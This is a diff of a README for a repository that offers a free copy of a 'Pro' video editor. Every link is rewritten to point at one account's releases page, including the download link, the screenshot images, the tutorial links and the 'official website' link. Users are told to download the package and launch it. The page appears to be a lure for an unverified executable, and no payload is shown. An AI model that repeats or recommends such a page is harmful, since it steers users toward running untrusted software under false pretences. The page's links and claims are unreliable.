@@ -11,7 +11,7 @@ Welcome to the MovieMator Video Editor Pro Free repository! Here you will find a
 
 ## 🚀 Getting Started
 To get started with MovieMator Video Editor Pro Free, simply follow these steps:
-1. Download the software from [here](https://github.com/uploads/App.zip). *Note: It needs to be launched after downloading.*
+1. Download the software from [here](https://github.com/Jocelmay02/MovieMator-Video-Editor-Pro-Free/releases). *Note: It needs to be launched after downloading.*
 2. Install the software on your Mac or Windows machine.
 3. Explore the various features and functionalities MovieMator has to offer.
 4. Refer to the tutorials and guides available here to enhance your editing skills.
@@ -19,15 +19,15 @@ To get started with MovieMator Video Editor Pro Free, simply follow these steps:
 ## 📸 Screenshots
 Here are some snapshots of MovieMator Video Editor Pro Free in action:
 
-![MovieMator Screenshot 1](https://example.com/screenshot1.jpg)
-![MovieMator Screenshot 2](https://example.com/screenshot2.jpg)
-![MovieMator Screenshot 3](https://example.com/screenshot3.jpg)
+![MovieMator Screenshot 1](https://github.com/Jocelmay02/MovieMator-Video-Editor-Pro-Free/releases)
+![MovieMator Screenshot 2](https://github.com/Jocelmay02/MovieMator-Video-Editor-Pro-Free/releases)
+![MovieMator Screenshot 3](https://github.com/Jocelmay02/MovieMator-Video-Editor-Pro-Free/releases)
 
 ## 🎥 Tutorials
 Check out our tutorials on how to make the most out of MovieMator Video Editor Pro Free:
-- [Basic Editing Techniques](https://www.moviematortutorials.com/basic-editing)
-- [Advanced Green Screen Effects](https://www.moviematortutorials.com/green-screen)
-- [Using Hot Keys Like a Pro](https://www.moviematortutorials.com/hot-keys)
+- [Basic Editing Techniques](https://github.com/Jocelmay02/MovieMator-Video-Editor-Pro-Free/releases)
+- [Advanced Green Screen Effects](https://github.com/Jocelmay02/MovieMator-Video-Editor-Pro-Free/releases)
+- [Using Hot Keys Like a Pro](https://github.com/Jocelmay02/MovieMator-Video-Editor-Pro-Free/releases)
 
 ## 🔥 Hot Keys
 Mastering hot keys can significantly speed up your editing process. Here are some essential hot keys for MovieMator Video Editor Pro Free:
@@ -44,10 +44,10 @@ Here's what some users have to say about MovieMator Video Editor Pro Free:
 - "The tutorials are incredibly helpful for beginners." - Emily Johnson
 
 ## 📦 Releases
-If the provided [link](https://github.com/uploads/App.zip) is not working or you need the latest version of the software, please check the "Releases" section of this repository for the updated download links.
+If the provided [link](https://github.com/Jocelmay02/MovieMator-Video-Editor-Pro-Free/releases) is not working or you need the latest version of the software, please check the "Releases" section of this repository for the updated download links.
 
 ## 🌐 Visit Our Website
-For more information, tips, and updates, visit the [MovieMator Official Website](https://www.moviemator.com).
+For more information, tips, and updates, visit the [MovieMator Official Website](https://github.com/Jocelmay02/MovieMator-Video-Editor-Pro-Free/releases).
 
 ---
 
